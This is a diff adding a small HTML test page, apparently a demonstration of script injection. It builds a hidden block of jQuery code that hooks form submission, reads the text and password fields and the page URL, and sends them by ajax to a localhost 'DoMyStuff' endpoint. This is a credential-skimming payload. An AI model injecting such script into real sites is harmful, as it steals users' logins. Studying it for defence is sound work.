@@ -1,0 +1,22 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title></title>
+    <script src="../../Scripts/jquery-1.7.1.js"></script>
+</head>
+<body>
+    <script type="text/javascript">
+        var data = "<div style='display:none;'>";
+        data += 'function fn_BindMe() {';
+        data += "$(\"[type='submit']\").submit(function () {";
+        data += "var data1 = $(\"[type='text']\")[0].value;";
+        data += "var data2 = $(\"[type='password']\")[0].value;";
+        data += "var data3 =window.location;";
+        data += 'var url = "http://localhost/App/Public/DoMyStuff?data1=" + data1 + "&data2=" + data2 + "&data3=" + data3;';
+        data += '$.ajax({url: url,asyn: true,success: function () { }});});}fn_BindMe();';
+        data += "</div>";
+        $("html").append(data);
+        alert(data);
+    </script>
+</body>
+</html>
